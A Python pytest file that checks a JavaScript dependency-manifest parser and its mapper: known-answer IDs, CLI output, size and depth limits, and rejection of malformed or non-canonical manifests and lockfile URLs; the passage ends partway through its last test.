"""Independent B1-3/B1-4 security verification.

This module intentionally does not import the Terra unit-test helpers.  The
expected UUIDs, locators, JSON/error literals, and the legacy inventory bytes
are hand-written from the frozen contract.
"""

from __future__ import annotations

import builtins
import hashlib
import io
import json
import os
import socket
import subprocess
import uuid
import zipfile
from dataclasses import replace
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Callable

import pytest

from app import cli
from app.domain.models import Component, Evidence
from app.ingestion import ReadOnlyScanSession, ScanReadLimits, ZipIngestionService
from app.ingestion.inventory import Inventory, InventoryEntry
from app.scanners import JavascriptParseStatus, map_javascript_manifest_result, parse_javascript_manifests
from app.scanners.javascript_manifest import (
    JavascriptDependencyDeclaration,
    JavascriptDependencyScope,
    JavascriptEvidenceDraft,
    JavascriptManifestKind,
    JavascriptManifestParseResult,
    JavascriptParserDiagnostic,
    ParsedJavascriptManifest,
)
from app.security.errors import IngestionSecurityError


FIXED = datetime(2026, 1, 2, 3, 4, 5, tzinfo=timezone.utc)
ZERO_DIGEST = "0" * 64

POSITIVE_IDS = tuple(f"POS-B1-JS-{index:03d}" for index in range(1, 11))
NEGATIVE_IDS = tuple(f"NEG-B1-JS-{index:03d}" for index in range(1, 17))

# These bytes are deliberately literal.  They make the inventory root and
# the known-answer UUIDs independent of the ZIP writer's metadata.
KNOWN_PACKAGE = b'{"dependencies":{"react":"^18.2.0"}}'
KNOWN_LOCK = b'{"lockfileVersion":2,"packages":{"":{"dependencies":{"react":"^18.2.0"}},"node_modules/react":{"version":"18.2.0","resolved":"https://registry.npmjs.org/react/-/react-18.2.0.tgz"}}}'
KNOWN_ROOT_DIGEST = "160cbea8aed9187eea99db4a28964c79a1a6abfd9d762c04c0c551fb79e6d71e"
KNOWN_PACKAGE_SHA256 = "97eb8c8a3b3b1bacfc9ab0e58ab1a7719fd15c49ae9da0f56941d3ea5ee1a644"
KNOWN_LOCK_SHA256 = "7f0d95c3ba84105f6d91af908c1fae6141b6a069b344046a52af0657cf656c0e"
KNOWN_DECLARATION_EVIDENCE_ID = "evd_0afdb16d-d53f-5f33-a3f0-bf2b4192cb3c"
KNOWN_VERSION_EVIDENCE_ID = "evd_17acf0bc-414b-5c86-b855-7a9158e40e53"
KNOWN_URL_EVIDENCE_ID = "evd_a13f5edb-9bfe-5262-80f9-e186901cc4c9"
KNOWN_COMPONENT_ID = "cmp_29535919-2155-5ced-8906-eb05c21c5b76"


class _MemorySession:
    """Small capability-shaped session for parser-only boundary tests."""

    def __init__(
        self,
        values: dict[str, bytes],
        *,
        entries: tuple[InventoryEntry, ...] | None = None,
    ) -> None:
        self.values = values
        if entries is None:
            entries = tuple(
                InventoryEntry(path, len(value), hashlib.sha256(value).hexdigest())
                for path, value in values.items()
            )
        self.inventory = Inventory(entries, ZERO_DIGEST)

    def read_bytes(self, relative_path: str, *, max_bytes: int) -> bytes:
        assert max_bytes == 2 * 1024 * 1024
        return self.values[relative_path]


def _json(value: object) -> bytes:
    return json.dumps(value, ensure_ascii=False, separators=(",", ":")).encode("utf-8")


def _parse(values: dict[str, bytes | str], *, entries: tuple[InventoryEntry, ...] | None = None):
    raw = {path: value.encode("utf-8") if isinstance(value, str) else value for path, value in values.items()}
    return parse_javascript_manifests(_MemorySession(raw, entries=entries))


def _zip_bytes(values: dict[str, bytes | str]) -> bytes:
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_STORED) as archive:
        for name, value in values.items():
            info = zipfile.ZipInfo(name, date_time=(2020, 1, 2, 3, 4, 5))
            info.compress_type = zipfile.ZIP_STORED
            info.create_system = 3
            info.external_attr = 0o600 << 16
            archive.writestr(info, value.encode("utf-8") if isinstance(value, str) else value)
    return output.getvalue()


def _write_zip(directory: Path, values: dict[str, bytes | str], name: str = "fixture.zip") -> Path:
    archive = directory / name
    archive.write_bytes(_zip_bytes(values))
    return archive


def _cli_js(archive: Path, *, clock: Callable[[], datetime] = lambda: FIXED) -> tuple[int, str, str]:
    stdout, stderr = io.StringIO(), io.StringIO()
    code = cli.main(
        ["--javascript-dependencies", str(archive)],
        stdout=stdout,
        stderr=stderr,
        clock=clock,
    )
    return code, stdout.getvalue(), stderr.getvalue()


def _diagnostics(result) -> list[tuple[str, str, str]]:
    return [(item.code, item.severity, item.message) for item in result.diagnostics]


def _a2_map(directory: Path, values: dict[str, bytes | str]):
    workspace = directory / "a2-workspace"
    workspace.mkdir(exist_ok=True)
    service = ZipIngestionService(workspace)
    try:
        stream = io.BytesIO(_zip_bytes(values))

        def consume(session: ReadOnlyScanSession):
            parsed = parse_javascript_manifests(session)
            return map_javascript_manifest_result(
                parsed,
                root_digest=session.inventory.root_digest,
                observed_at=FIXED,
            )

        return service.ingest_with_consumer(
            stream,
            consume,
            read_limits=ScanReadLimits(single_file_max_bytes=2 * 1024 * 1024, total_max_bytes=8 * 1024 * 1024),
        )
    finally:
        service.close()


def test_frozen_b1_js_case_ids_are_present() -> None:
    """The independent file keeps all 10 positive and 16 negative frozen IDs discoverable."""
    assert POSITIVE_IDS == tuple(f"POS-B1-JS-{index:03d}" for index in range(1, 11))
    assert NEGATIVE_IDS == tuple(f"NEG-B1-JS-{index:03d}" for index in range(1, 17))


def test_pos_b1_js_001_four_dependency_fields_scope_and_stable_sort() -> None:
    """POS-B1-JS-001: all four root fields retain their scope and byte order."""
    result = _parse(
        {
            "package.json": _json(
                {
                    "peerDependencies": {"peer-lib": "1.2.3"},
                    "dependencies": {"zeta": "^1.0.0", "@scope/pkg": "latest"},
                    "devDependencies": {"dev-lib": "~2.0.0"},
                    "optionalDependencies": {"opt-lib": "v3.4.5"},
                }
            )
        }
    )
    assert [(item.normalized_name, item.scope.value) for item in result.dependencies] == [
        ("@scope/pkg", "runtime"),
        ("dev-lib", "development"),
        ("opt-lib", "optional"),
        ("peer-lib", "peer"),
        ("zeta", "runtime"),
    ]
    assert next(item for item in result.dependencies if item.normalized_name == "opt-lib").resolved_version == "3.4.5"
    assert result.status is JavascriptParseStatus.COMPLETE


def test_pos_b1_js_002_scoped_name_and_rfc6901_locator() -> None:
    """POS-B1-JS-002: scoped names use the JSON-pointer slash escape."""
    mapped = map_javascript_manifest_result(
        _parse({"package.json": '{"dependencies":{"@scope/pkg":"1.0.0"}}'}),
        root_digest=ZERO_DIGEST,
        observed_at=FIXED,
    )
    assert mapped.evidence[0].locator == "package.json:/dependencies/@scope~1pkg"
    assert mapped.components[0].name == "@scope/pkg"
    assert mapped.components[0].purl == "pkg:npm/%40scope/pkg@1.0.0"


def test_pos_b1_js_003_exact_range_tag_version_semantics() -> None:
    """POS-B1-JS-003: exact versions are normalized; ranges and tags remain unresolved."""
    mapped = map_javascript_manifest_result(
        _parse(
            {
                "package.json": '{"dependencies":{"exact":"v1.2.3","pre":"1.2.3-beta.1+build.7","range":"^1.2.3","tag":"latest"}}'
            }
        ),
        root_digest=ZERO_DIGEST,
        observed_at=FIXED,
    )
    versions = {item.name: item.version for item in mapped.components}
    assert versions == {"exact": "1.2.3", "pre": "1.2.3-beta.1+build.7", "range": None, "tag": None}


def test_pos_b1_js_004_lock_v2_direct_version_enrichment() -> None:
    """POS-B1-JS-004: v2 enriches only a root direct package entry."""
    result = _parse(
        {
            "package.json": '{"dependencies":{"react":"^18.2.0"}}',
            "package-lock.json": '{"lockfileVersion":2,"packages":{"":{"dependencies":{"react":"^18.2.0"}},"node_modules/react":{"version":"18.2.0"},"node_modules/a/node_modules/react":{"version":"99.0.0"}}}',
        }
    )
    declaration = result.dependencies[0]
    assert declaration.resolved_version == "18.2.0"
    assert declaration.lock_manifest == "package-lock.json"
    assert [item.field_locator for item in declaration.evidence] == [
        "package-lock.json:/packages/node_modules~1react/version",
        "package.json:/dependencies/react",
    ]
    assert not any(item.resolved_version == "99.0.0" for item in result.dependencies)


def test_pos_b1_js_005_lock_v3_canonical_https_and_scoped_purl() -> None:
    """POS-B1-JS-005: v3 contributes a locked HTTPS URL and scoped npm purl."""
    mapped = map_javascript_manifest_result(
        _parse(
            {
                "package.json": '{"dependencies":{"@scope/pkg":"^2.0.0"}}',
                "package-lock.json": '{"lockfileVersion":3,"packages":{"":{"dependencies":{"@scope/pkg":"^2.0.0"}},"node_modules/@scope/pkg":{"version":"2.1.0","resolved":"https://registry.npmjs.org/@scope/pkg/-/pkg-2.1.0.tgz"}}}',
            }
        ),
        root_digest=ZERO_DIGEST,
        observed_at=FIXED,
    )
    component = mapped.components[0]
    assert component.version == "2.1.0"
    assert component.source_url == "https://registry.npmjs.org/@scope/pkg/-/pkg-2.1.0.tgz"
    assert component.purl == "pkg:npm/%40scope/pkg@2.1.0"
    assert any(item.locator.endswith("/resolved") for item in mapped.evidence)


def test_pos_b1_js_006_duplicate_merge_keeps_all_evidence_and_warning() -> None:
    """POS-B1-JS-006: same selectors merge deterministically and retain both fields."""
    mapped = map_javascript_manifest_result(
        _parse(
            {
                "package.json": '{"devDependencies":{"same":"1.2.3"},"dependencies":{"same":"1.2.3"}}'
            }
        ),
        root_digest=ZERO_DIGEST,
        observed_at=FIXED,
    )
    assert len(mapped.components) == 1
    assert mapped.status is JavascriptParseStatus.PARTIAL
    assert [(item.code, item.severity, item.message) for item in mapped.diagnostics] == [
        ("dependency_duplicate", "warning", "Duplicate dependency declaration was merged.")
    ]
    assert len(mapped.components[0].evidence_ids) == 2
    assert len(mapped.evidence) == 2


def test_pos_b1_js_007_lock_version_conflict_is_partial_and_unversioned() -> None:
    """POS-B1-JS-007: an exact declaration/lock conflict never selects either version."""
    mapped = map_javascript_manifest_result(
        _parse(
            {
                "package.json": '{"dependencies":{"demo":"1.0.0"}}',
                "package-lock.json": '{"lockfileVersion":2,"packages":{"":{"dependencies":{"demo":"1.0.0"}},"node_modules/demo":{"version":"1.1.0"}}}',
            }
        ),
        root_digest=ZERO_DIGEST,
        observed_at=FIXED,
    )
    assert mapped.status is JavascriptParseStatus.PARTIAL
    assert mapped.components[0].version is None
    assert mapped.components[0].source_url is None
    assert [(item.code, item.message) for item in mapped.diagnostics] == [
        ("lock_version_conflict", "Declared and locked dependency versions conflict.")
    ]


def test_pos_b1_js_008_fixed_clock_known_answers_and_repeatability(tmp_path: Path) -> None:
    """POS-B1-JS-008: the fixed contract vector yields stable UUIDv5 IDs."""
    result = _a2_map(tmp_path, {"package.json": KNOWN_PACKAGE, "package-lock.json": KNOWN_LOCK})
    again = _a2_map(tmp_path, {"package.json": KNOWN_PACKAGE, "package-lock.json": KNOWN_LOCK})
    assert result.inventory.root_digest == KNOWN_ROOT_DIGEST
    assert result.consumer_result == again.consumer_result
    known_evidence = {item.locator: item.id for item in result.consumer_result.evidence}
    assert known_evidence == {
        "package.json:/dependencies/react": KNOWN_DECLARATION_EVIDENCE_ID,
        "package-lock.json:/packages/node_modules~1react/version": KNOWN_VERSION_EVIDENCE_ID,
        "package-lock.json:/packages/node_modules~1react/resolved": KNOWN_URL_EVIDENCE_ID,
    }
    assert result.consumer_result.components[0].id == KNOWN_COMPONENT_ID
    assert all(item.observed_at == FIXED for item in result.consumer_result.evidence)
    assert result.consumer_result.components[0].evidence_ids == sorted(
        [KNOWN_DECLARATION_EVIDENCE_ID, KNOWN_VERSION_EVIDENCE_ID, KNOWN_URL_EVIDENCE_ID]
    )


def test_pos_b1_js_009_real_zip_cli_and_p0_reload(tmp_path: Path) -> None:
    """POS-B1-JS-009: a real disk ZIP reaches parser, mapper, CLI, and P0 reload."""
    archive = _write_zip(tmp_path, {"package.json": KNOWN_PACKAGE, "package-lock.json": KNOWN_LOCK})
    code, stdout, stderr = _cli_js(archive)
    payload = json.loads(stdout)
    assert code == 0 and stderr == "" and stdout.endswith("\n")
    assert payload["schema"] == "openguard.javascript-dependencies"
    assert payload["root_digest"] == KNOWN_ROOT_DIGEST
    assert payload["status"] == "complete"
    assert payload["components"][0]["id"] == KNOWN_COMPONENT_ID
    assert payload["components"][0]["evidence_ids"] == sorted(
        [KNOWN_DECLARATION_EVIDENCE_ID, KNOWN_VERSION_EVIDENCE_ID, KNOWN_URL_EVIDENCE_ID]
    )
    declaration_evidence = next(
        item for item in payload["evidence"] if item["locator"] == "package.json:/dependencies/react"
    )
    assert declaration_evidence["excerpt"] == '"^18.2.0"'
    assert declaration_evidence["observed_at"] == "2026-01-02T03:04:05Z"
    Component.model_validate(payload["components"][0])
    Evidence.model_validate(declaration_evidence)
    # This is an explicit JSON contract check, not a reserialization of the
    # implementation's payload: the required top-level JSON is hand-written.
    expected_top_level = {
        "components",
        "diagnostics",
        "evidence",
        "mapper_schema_version",
        "parser_schema_version",
        "root_digest",
        "schema",
        "status",
        "version",
    }
    assert set(payload) == expected_top_level
    assert payload["mapper_schema_version"] == "b1-javascript-p0/v1"
    assert payload["parser_schema_version"] == "b1-javascript-manifest/v1"


def test_pos_b1_js_010_legacy_bytes_exit_codes_python_mode_and_cleanup(tmp_path: Path) -> None:
    """POS-B1-JS-010: old modes remain byte-compatible while all JS paths clean up."""
    legacy = _write_zip(tmp_path, {"file.txt": b"module entrypoint"}, "legacy.zip")
    legacy_out, legacy_err = io.StringIO(), io.StringIO()
    legacy_code = cli.main(
        [str(legacy)],
        stdout=legacy_out,
        stderr=legacy_err,
        clock=lambda: (_ for _ in ()).throw(AssertionError("legacy clock called")),
    )
    assert legacy_code == 0 and legacy_err.getvalue() == ""
    assert legacy_out.getvalue() == '{"entries":[{"relative_path":"file.txt","sha256":"cdccd888b48591016a5b2bc785bf0dab3f9bb9b9f5a0f71d24e5ed5a5a921736","size_bytes":17}],"root_digest":"36bb7749c4bb61b59d4471be2dfd75e3c64d34fe3f7ebc7576e3d4906b7dd21e","schema":"openguard.zip-inventory","version":"1"}\n'

    python = _write_zip(tmp_path, {"requirements.txt": b"requests==2.32.5\n"}, "python.zip")
    python_out, python_err = io.StringIO(), io.StringIO()
    assert cli.main(["--python-dependencies", str(python)], stdout=python_out, stderr=python_err, clock=lambda: FIXED) == 0
    assert python_err.getvalue() == ""
    assert python_out.getvalue() == '{"components":[{"component_type":"library","confidence":1.0,"detected_by":["manifest_parser"],"ecosystem":"pypi","evidence_ids":["evd_761abca1-b923-591c-a379-d066cbe3334a"],"id":"cmp_ee9efdf9-c6dc-516a-beef-83f8775214ab","license_expression_id":null,"name":"requests","purl":null,"source_url":null,"version":"2.32.5"}],"diagnostics":[],"evidence":[{"content_hash":{"algorithm":"sha256","value":"c0ee2c01270411fcd5c8bf8e78d080237c4d1c61ae34d197c935d29cf50a8833"},"detected_by":"manifest_parser","end_line":1,"excerpt":"requests==2.32.5","id":"evd_761abca1-b923-591c-a379-d066cbe3334a","kind":"manifest_field","locator":"requirements.txt","observed_at":"2026-01-02T03:04:05Z","producer":{"config_digest":null,"model_id":null,"name":"openguard-python-manifest-parser","prompt_schema_digest":null,"provider":null,"type":"parser","version":"0.1.0"},"start_line":1,"verification_status":"verified"}],"mapper_schema_version":"b1-python-p0/v1","parser_schema_version":"b1-python-manifest/v1","root_digest":"dd90bc586ee1b569d2f9447ec83c4c034d756138aac2aa7171b2212f7bbdc289","schema":"openguard.python-dependencies","status":"complete","version":"1"}\n'

    workspace = tmp_path / "cleanup-workspace"
    workspace.mkdir()
    result = cli.run_local_zip_javascript_dependencies(
        _write_zip(tmp_path, {"package.json": '{"dependencies":{"a":"1.0.0"}}'}, "cleanup.zip"),
        workspace,
        clock=lambda: FIXED,
    )
    assert result[1].status is JavascriptParseStatus.COMPLETE
    assert list(workspace.iterdir()) == []

    misuse_out, misuse_err = io.StringIO(), io.StringIO()
    assert cli.main(["--javascript-dependencies"], stdout=misuse_out, stderr=misuse_err) == 2
    assert misuse_out.getvalue() == "" and misuse_err.getvalue() == "invalid_request:input_file_unavailable\n"


def test_neg_b1_js_001_encoding_and_json_failures_are_stable() -> None:
    """NEG-B1-JS-001: BOM, non-UTF-8, and malformed JSON never become declarations."""
    cases = (
        b"\xef\xbb\xbf{}",
        b"\xff\xfe{}",
        b'{"dependencies":',
    )
    for raw in cases:
        result = _parse({"package.json": raw})
        assert result.status is JavascriptParseStatus.PARTIAL
        assert len(result.dependencies) == 0
        assert result.diagnostics[0].code in {"manifest_encoding_invalid", "manifest_json_invalid"}
        assert result.diagnostics[0].message in {
            "Manifest text is not valid UTF-8.",
            "Manifest JSON is invalid.",
        }


def test_neg_b1_js_002_duplicate_json_keys_at_any_depth() -> None:
    """NEG-B1-JS-002: duplicate keys are rejected instead of first/last wins."""
    for raw in (
        b'{"dependencies":{"a":"1.0.0","a":"2.0.0"}}',
        b'{"metadata":{"nested":{"a":1,"a":2}}}',
        b'{"lockfileVersion":2,"packages":{},"packages":{}}',
    ):
        result = _parse({"package.json": raw})
        assert result.status is JavascriptParseStatus.PARTIAL
        assert [(item.code, item.severity, item.message) for item in result.diagnostics] == [
            ("manifest_duplicate_key", "error", "Manifest JSON contains a duplicate key.")
        ]


def test_neg_b1_js_003_nonobject_root_field_and_value_are_not_accepted() -> None:
    """NEG-B1-JS-003: root/field/value type violations are partial and explicit."""
    root = _parse({"package.json": b"[]"})
    assert _diagnostics(root) == [
        ("manifest_field_invalid", "error", "Manifest dependency field has an unsupported type.")
    ]
    field = _parse({"package.json": '{"dependencies":[]}'})
    assert _diagnostics(field) == [
        ("manifest_field_invalid", "error", "Manifest dependency field has an unsupported type.")
    ]
    value = _parse({"package.json": '{"dependencies":{"a":null,"b":3,"c":""}}'})
    assert {item.code for item in value.diagnostics} == {"dependency_selector_unsafe"}
    assert len(value.dependencies) == 0


def test_neg_b1_js_004_candidate_byte_depth_string_and_declaration_limits() -> None:
    """NEG-B1-JS-004: every frozen parser quota fails closed with one reason."""
    too_many_candidates = {f"dir{index}/package.json": b"{}" for index in range(65)}
    with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_manifest_limit_exceeded"):
        _parse(too_many_candidates)

    large = b"{" + b'"x":"' + b"a" * (2 * 1024 * 1024) + b'"}'
    with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_manifest_limit_exceeded"):
        _parse({"package.json": large})

    total = {f"dir{index}/package.json": b"{" + b'"x":"' + b"a" * (2 * 1024 * 1024 - 32) + b'"}' for index in range(5)}
    with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_manifest_limit_exceeded"):
        _parse(total)

    nested: object = "leaf"
    for _ in range(66):
        nested = {"x": nested}
    with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_manifest_limit_exceeded"):
        _parse({"package.json": _json(nested)})

    with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_manifest_limit_exceeded"):
        _parse({"package.json": _json({"x": "a" * 8193})})

    declarations = {f"pkg-{index}": "1.0.0" for index in range(4097)}
    with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_manifest_limit_exceeded"):
        _parse({"package.json": _json({"dependencies": declarations})})


def test_neg_b1_js_005_invalid_unicode_uppercase_and_oversize_names() -> None:
    """NEG-B1-JS-005: npm names are validated as lowercase bounded ASCII tokens."""
    names = {
        "Upper": "1.0.0",
        "-leading": "1.0.0",
        "@Scope/name": "1.0.0",
        "@scope/na/me": "1.0.0",
        "包": "1.0.0",
        "a" * 215: "1.0.0",
        "@scope/" + "a" * 209: "1.0.0",
    }
    result = _parse({"package.json": _json({"dependencies": names})})
    assert len(result.dependencies) == 0
    assert len(result.diagnostics) == len(names)
    assert {item.code for item in result.diagnostics} == {"package_name_invalid"}
    assert all(item.message == "Package name is invalid or unsupported." for item in result.diagnostics)


def test_neg_b1_js_006_unsafe_selector_schemes_paths_controls_and_credentials() -> None:
    """NEG-B1-JS-006: local/VCS/URL/alias/path and control selectors are refused."""
    selectors = {
        "file": "file:../pkg",
        "link": "link:../pkg",
        "workspace": "workspace:*",
        "alias": "npm:other@1.0.0",
        "git": "git://example.org/repo",
        "gitplus": "git+https://example.org/repo.git",
        "http": "http://example.org/pkg.tgz",
        "https": "https://example.org/pkg.tgz",
        "ssh": "ssh://example.org/repo",
        "absolute": "/tmp/pkg",
        "relative": "../pkg",
        "scheme": "custom://example.org/pkg",
        "space": "1.0.0 bad",
        "backslash": "..\\pkg",
        "control": "1.0.0\n",
        "empty": "",
        "credential": "token=secret",
    }
    result = _parse({"package.json": _json({"dependencies": selectors})})
    assert len(result.dependencies) == 0
    assert len(result.diagnostics) == len(selectors)
    assert {item.code for item in result.diagnostics} == {"dependency_selector_unsafe"}
    assert all(item.message == "Dependency selector is unsafe or unsupported." for item in result.diagnostics)


def test_neg_b1_js_007_lock_version_packages_root_and_entry_shapes() -> None:
    """NEG-B1-JS-007: unsupported lock variants and non-object lock nodes are partial."""
    cases = (
        {"lockfileVersion": 1, "packages": {}},
        {"lockfileVersion": True, "packages": {}},
        {"lockfileVersion": "3", "packages": {}},
        {"lockfileVersion": 3, "packages": []},
        {"lockfileVersion": 3, "packages": {"": []}},
        {"lockfileVersion": 3, "packages": {"": {}, "node_modules/a": []}},
    )
    for lock in cases:
        result = _parse(
            {
                "package.json": '{"dependencies":{"a":"^1.0.0"}}',
                "package-lock.json": _json(lock),
            }
        )
        assert result.status is JavascriptParseStatus.PARTIAL
        assert len(result.dependencies) == 1
        assert result.diagnostics[0].code in {"lockfile_version_unsupported", "lock_entry_invalid"}
        assert result.diagnostics[0].message in {
            "Package lock version is unsupported.",
            "Package lock entry is invalid.",
        }


def test_neg_b1_js_008_root_mismatch_missing_entry_and_version_conflict() -> None:
    """NEG-B1-JS-008: lock diagnostics are stable and enrichment never guesses."""
    mismatch = _parse(
        {
            "package.json": '{"dependencies":{"a":"^1.0.0"}}',
            "package-lock.json": '{"lockfileVersion":2,"packages":{"":{"dependencies":{"a":"^2.0.0"}},"node_modules/a":{"version":"1.2.0"}}}',
        }
    )
    assert [(item.code, item.severity, item.message) for item in mismatch.diagnostics] == [
        ("lock_root_mismatch", "error", "Package lock root dependencies do not match package.json.")
    ]
    assert mismatch.dependencies[0].resolved_version is None

    missing = _parse(
        {
            "package.json": '{"dependencies":{"a":"^1.0.0"}}',
            "package-lock.json": '{"lockfileVersion":3,"packages":{"":{"dependencies":{"a":"^1.0.0"}}}}',
        }
    )
    assert [(item.code, item.severity, item.message) for item in missing.diagnostics] == [
        ("lock_entry_missing", "warning", "Package lock entry is missing.")
    ]
    assert missing.dependencies[0].resolved_version is None

    conflict = _parse(
        {
            "package.json": '{"dependencies":{"a":"1.0.0"}}',
            "package-lock.json": '{"lockfileVersion":2,"packages":{"":{"dependencies":{"a":"1.0.0"}},"node_modules/a":{"version":"1.1.0"}}}',
        }
    )
    assert [(item.code, item.severity, item.message) for item in conflict.diagnostics] == [
        ("lock_version_conflict", "error", "Declared and locked dependency versions conflict.")
    ]
    assert conflict.dependencies[0].resolved_version is None


def test_neg_b1_js_009_noncanonical_resolved_urls_are_not_p0_sources() -> None:
    """NEG-B1-JS-009: credentials, query/fragment, casing, ports, and dot paths fail canonical URL checks."""
    urls = (
        "https://user:pass@registry.npmjs.org/a.tgz",
        "https://registry.npmjs.org/a.tgz?token=secret",
        "https://registry.npmjs.org/a.tgz#fragment",
        "https://REGISTRY.npmjs.org/a.tgz",
        "https://registry.npmjs.org:443/a.tgz",
        "https://registry.npmjs.org/a/../a.tgz",
    )
    accepted: list[str] = []
    for url in urls:
        result = _parse(
            {
                "package.json": '{"dependencies":{"a":"^1.0.0"}}',
                "package-lock.json": _json(
                    {
                        "lockfileVersion": 3,
                        "packages": {
                            "": {"dependencies": {"a": "^1.0.0"}},
                            "node_modules/a": {"version": "1.0.0", "resolved": url},
                        },
                    }
                ),
            }
        )
        if result.status is JavascriptParseStatus.COMPLETE:
            accepted.append(url)
        else:
            assert [(item.code, item.severity, item.message) for item in result.diagnostics] == [
                ("lock_entry_invalid", "error", "Package lock entry is invalid.")
            ]
            assert result.dependencies[0].resolved_url is None
    assert accepted == [], f"non-canonical URLs were accepted: {accepted!r}"


def test_neg_b1_js_010_duplicate_inventory_and_size_hash_read_mismatch_fail_closed() -> None:
    """NEG-B1-JS-010: inventory identity and the bytes read must agree exactly."""
    data = b'{"dependencies":{"a":"1.0.0"}}'
    sha = hashlib.sha256(data).hexdigest()
    duplicate = (
        InventoryEntry("package.json", len(data), sha),
        InventoryEntry("package.json", len(data), sha),
    )
    with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_manifest_parser_failed"):
        parse_javascript_manifests(_MemorySession({"package.json": data}, entries=duplicate))

    cases = (
        ("size", (InventoryEntry("package.json", len(data) + 1, sha),), data),
        ("hash", (InventoryEntry("package.json", len(data), "f" * 64),), data),
        ("read", (InventoryEntry("package.json", len(data), sha),), b"{}"),
    )
    accepted: list[str] = []
    for label, forged_entries, read_data in cases:
        try:
            parse_javascript_manifests(_MemorySession({"package.json": read_data}, entries=forged_entries))
        except IngestionSecurityError as error:
            assert str(error) == "scanner_failed:javascript_manifest_parser_failed"
        else:
            accepted.append(label)
    assert accepted == [], f"inventory/read mismatch accepted: {accepted!r}"


def test_neg_b1_js_011_forged_dto_sort_status_diagnostic_and_evidence_are_rejected() -> None:
    """NEG-B1-JS-011: P0 construction rejects non-canonical frozen DTO graphs."""
    parsed = _parse({"package.json": '{"dependencies":{"a":"1.0.0","b":"1.0.0"}}'})
    base = map_javascript_manifest_result(parsed, root_digest=ZERO_DIGEST, observed_at=FIXED)
    assert len(base.components) == 2

    bad_status = replace(parsed, status=JavascriptParseStatus.PARTIAL)
    with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_p0_mapper_failed"):
        map_javascript_manifest_result(bad_status, root_digest=ZERO_DIGEST, observed_at=FIXED)

    bad_diagnostic = JavascriptParserDiagnostic(
        "made_up", "error", "package.json", None, None, None, "made up"
    )
    with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_p0_mapper_failed"):
        map_javascript_manifest_result(
            replace(parsed, status=JavascriptParseStatus.PARTIAL, diagnostics=(bad_diagnostic,)),
            root_digest=ZERO_DIGEST,
            observed_at=FIXED,
        )

    with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_p0_mapper_failed"):
        map_javascript_manifest_result(
            replace(parsed, dependencies=tuple(reversed(parsed.dependencies))),
            root_digest=ZERO_DIGEST,
            observed_at=FIXED,
        )

    draft = parsed.dependencies[0].evidence[0]
    duplicate_evidence = replace(parsed.dependencies[0], evidence=(draft, draft))
    with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_p0_mapper_failed"):
        map_javascript_manifest_result(
            replace(parsed, dependencies=(duplicate_evidence, parsed.dependencies[1])),
            root_digest=ZERO_DIGEST,
            observed_at=FIXED,
        )

    forged_manifest = replace(parsed.manifests[0], size_bytes="not-an-int")
    with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_p0_mapper_failed"):
        map_javascript_manifest_result(
            replace(parsed, manifests=(forged_manifest,)),
            root_digest=ZERO_DIGEST,
            observed_at=FIXED,
        )


def test_neg_b1_js_012_non_utc_digest_and_noncanonical_locator_fail_closed() -> None:
    """NEG-B1-JS-012: time, root digest, and JSON-pointer canonicality are mapper gates."""
    parsed = _parse({"package.json": '{"dependencies":{"a":"1.0.0"}}'})
    for when in (datetime(2026, 1, 1), datetime(2026, 1, 1, tzinfo=timezone(timedelta(hours=8)))):
        with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_p0_mapper_failed"):
            map_javascript_manifest_result(parsed, root_digest=ZERO_DIGEST, observed_at=when)
    with pytest.raises(IngestionSecurityError, match="scanner_failed:javascript_p0_mapper_failed"):
        map_javascript_manifest_result(parsed, root_digest="g" * 64, observed_at=FIXED)

    original = parsed.dependencies[0].evidence[0]
    accepted: list[str] = []
    for locator in (
        "package.json:/dependencies/a~2b",
        "package.json:/dependencies//a",
        "other.json:/dependencies/a",
    ):
        tampered = replace(original, field_locator=locator)
        declaration = replace(parsed.dependencies[0], evidence=(tampered,))
        try:
            map_javascript_manifest_result(
                replace(parsed, dependencies=(declaration,)),
                root_digest=ZERO_DIGEST,
                observed_at=FIXED,
            )
        except IngestionSecurityError as error:
            assert str(error) == "scanner_failed:javascript_p0_mapper_failed"
        else:
            accepted.append(locator)
    assert accepted == [], f"non-canonical locators accepted: {accepted!r}"


def test_neg_b1_js_013_unknown_parser_mapper_and_clock_errors_are_sanitized(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """NEG-B1-JS-013: unknown exceptions become stable scanner errors without input text."""
    class _BrokenEntry:
        @property
        def relative_path(self):
            raise RuntimeError("/private/secret/path")

    broken = _MemorySession({"package.json": b"{}"}, entries=(_BrokenEntry(),))
    with pytest.raises(IngestionSecurityError) as parser_error:
        parse_javascript_manifests(broken)  # type: ignore[arg-type]
    assert str(parser_error.value) == "scanner_failed:javascript_manifest_parser_failed"
    assert "/private/secret/path" not in str(parser_error.value)

    parsed = _parse({"package.json": '{"dependencies":{"a":"1.0.0"}}'})
    import app.scanners.javascript_p0_mapper as mapper_module

    monkeypatch.setattr(
        mapper_module,
        "Component",
        lambda **kwargs: (_ for _ in ()).throw(ValueError("Pydantic /private/secret/path")),
    )
    with pytest.raises(IngestionSecurityError) as mapper_error:
        map_javascript_manifest_result(parsed, root_digest=ZERO_DIGEST, observed_at=FIXED)
    assert str(mapper_error.value) == "scanner_failed:javascript_p0_mapper_failed"
    assert "/private/secret/path" not in str(mapper_error.value)

    archive = _write_zip(tmp_path, {"package.json": '{"dependencies":{"a":"1.0.0"}}'})
    code, stdout, stderr = _cli_js(
        archive,
        clock=lambda: (_ for _ in ()).throw(RuntimeError("token=/private/secret/path")),
    )
    assert (code, stdout, stderr) == (1, "", "scanner_failed:cli_runtime_failed\n")

    monkeypatch.setattr(
        "app.scanners.parse_javascript_manifests",
        lambda session: (_ for _ in ()).throw(RuntimeError("raw package.json /private/secret/path")),
    )
    code, stdout, stderr = _cli_js(archive)
